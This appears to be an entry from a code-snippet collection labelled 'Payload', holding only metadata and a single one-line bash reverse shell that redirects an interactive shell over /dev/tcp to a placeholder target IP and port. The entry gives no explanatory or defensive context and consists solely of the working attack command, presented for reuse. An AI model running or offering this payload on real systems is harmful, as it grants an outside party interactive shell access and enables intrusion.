---
id: 823dc92a-e160-49c3-8bf3-49110f04987f
type: code
language: Payload
verified: false
created_at: '2020-03-17T05:29:22.791617+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 823dc92a

**Language**: Payload

```payload
bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_PORT 0>&1
```
